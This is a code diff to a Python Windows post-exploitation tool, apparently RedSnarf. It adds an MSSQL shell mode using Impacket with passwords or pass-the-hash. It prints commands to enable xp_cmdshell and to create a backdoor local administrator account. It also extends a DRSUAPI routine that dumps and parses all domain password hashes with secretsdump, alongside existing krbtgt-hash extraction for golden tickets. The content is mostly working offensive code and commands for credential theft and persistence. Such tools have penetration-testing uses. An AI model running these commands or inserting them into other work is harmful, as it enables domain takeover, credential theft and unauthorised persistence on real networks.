@@ -1506,6 +1506,7 @@ p.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<O
 p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 p.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
 p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+p.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
 p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 p.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
@@ -1592,6 +1593,7 @@ unattend=args.unattend
 user_desc=args.user_desc
 recorddesktop=args.recorddesktop
 empire_launcher=args.empire_launcher
+mssqlshell=args.mssqlshell
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1635,6 +1637,45 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
+
+if mssqlshell=="WIN" or mssqlshell=="DB":
+	if len(targets)==1:
+		try:			
+			#Check to see whether the supplied password is a hash or not
+			pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+			pwdump = pwdumpmatch.match(passw)
+			
+			if pwdump:
+				passw=passw[0:-3]
+
+
+			print colored("[+]Starting Impacket MSSQL Shell\n",'green')
+			print colored("[+]Info - To manually turn on xp_cmdshell use",'green')
+			print colored("[+]exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;",'blue')
+			print colored("[+]exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n",'blue')
+
+			print colored("[+]Info - To add a new user",'green')
+			print colored("[+]xp_cmdshell 'net user redsnarf P@ssw0rd1 /add && net localgroup administrators redsnarf /add' ",'blue')
+
+			if mssqlshell=="WIN":
+				if pwdump:
+					#proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
+					os.system("mssqlclient.py -hashes "+passw+' '+domain_name+"/"+user+"@"+targets[0]+" -windows-auth ")
+				else:
+					os.system("mssqlclient.py "+domain_name+"/"+user+":"+passw+"@"+targets[0]+" -windows-auth ")
+
+			else:
+				os.system("mssqlclient.py "+user+":"+passw+"@"+targets[0])
+			
+			sys.exit()
+			
+		except OSError:
+			print colored("[-]Something went wrong starting SQL Shell",'red')
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
 
 if recorddesktop in yesanswers:
 	if len(targets)==1:
@@ -1737,7 +1778,6 @@ if golden_ticket in yesanswers:
 				print colored("[+]Connecting to DC to get krbtgt hash : ",'yellow')
 				
 				if pwdump:
-					#os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
 					proc = subprocess.Popen("secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
 				else:
 					proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
@@ -1755,10 +1795,7 @@ if golden_ticket in yesanswers:
 			
 			if len(kNTHASH)>0:
 				#Get the SID Information
-				
-
 				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-				
 
 				stdout_value = proc.communicate()[0]
 					
@@ -2342,7 +2379,29 @@ if drsuapi in yesanswers:
 				else:
 					sys.exit()
 			else:
-				print colored("[-]Something has gone wrong......",'red')
+				print colored("[+]Saving hashes to: "+outputpath+targets[0]+'/drsuapi_gethashes.txt','yellow')
+				pwdumpmatch = re.compile('^([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
+				pwdump = pwdumpmatch.match(passw)
+			
+				if pwdump:
+					passw=passw[0:-3]
+
+				if pwdump:
+					os.system("/usr/local/bin/secretsdump.py -hashes "+passw+' '+domain_name+'/'+user+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+				else:
+					os.system("/usr/local/bin/secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +'> '+outputpath+targets[0]+'/drsuapi_gethashes.txt')
+				
+				if os.path.isfile(outputpath+targets[0]+"/drsuapi_gethashes.txt"):
+					print colored("[+]Found file - completed : "+outputpath+targets[0],'green')
+					hashparse(outputpath+targets[0],'/drsuapi_gethashes.txt')
+				
+					if qldap in yesanswers:
+						print colored("[+]Checking LM User Account Status",'yellow')
+						userstatus(outputpath,targets[0],'lm_usernames.txt')
+						print colored("[+]Checking NT User Account Status",'yellow')
+						userstatus(outputpath,targets[0],'nt_usernames.txt')
+				
+					sys.exit()
 		
 		except OSError:
 			print colored("[-]Something went wrong using the drsuapi method",'red')
